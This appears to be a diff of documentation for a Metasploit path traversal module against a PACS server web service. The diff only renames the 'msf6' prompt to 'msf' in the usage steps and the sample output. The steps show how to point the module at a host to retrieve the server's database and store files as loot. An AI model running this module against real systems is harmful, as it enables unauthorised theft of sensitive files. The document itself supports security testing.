@@ -19,9 +19,9 @@ By default, the server listens on TCP port 3000 on all network interfaces.
 2. Start `msfconsole` and run the following commands:
 
 ```
-msf6 > use auxiliary/gather/pacsserver_traversal
-msf6 auxiliary(gather/pacsserver_traversal) > set RHOSTS <IP>
-msf6 auxiliary(gather/pacsserver_traversal) > run
+msf > use auxiliary/gather/pacsserver_traversal
+msf auxiliary(gather/pacsserver_traversal) > set RHOSTS <IP>
+msf auxiliary(gather/pacsserver_traversal) > run
 ```
 
 This should return the database for the web server. Any files retrieved will
@@ -43,7 +43,7 @@ The traversal depth. The FILE path will be prepended with /assets/ + ../ * DEPTH
 Running the exploit against v4.1.0 on Windows 22H22 should result in an output similar to the following:
 
 ```
-msf6 auxiliary(gather/pacsserver_traversal) > run
+msf auxiliary(gather/pacsserver_traversal) > run
 [*] Running module against 192.168.137.217
 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -57,7 +57,7 @@ msf6 auxiliary(gather/pacsserver_traversal) > run
 The file will be stored as loot:
 
 ```
-msf6 auxiliary(gather/upsmon_traversal) > loot
+msf auxiliary(gather/upsmon_traversal) > loot
 
 Loot
 ====
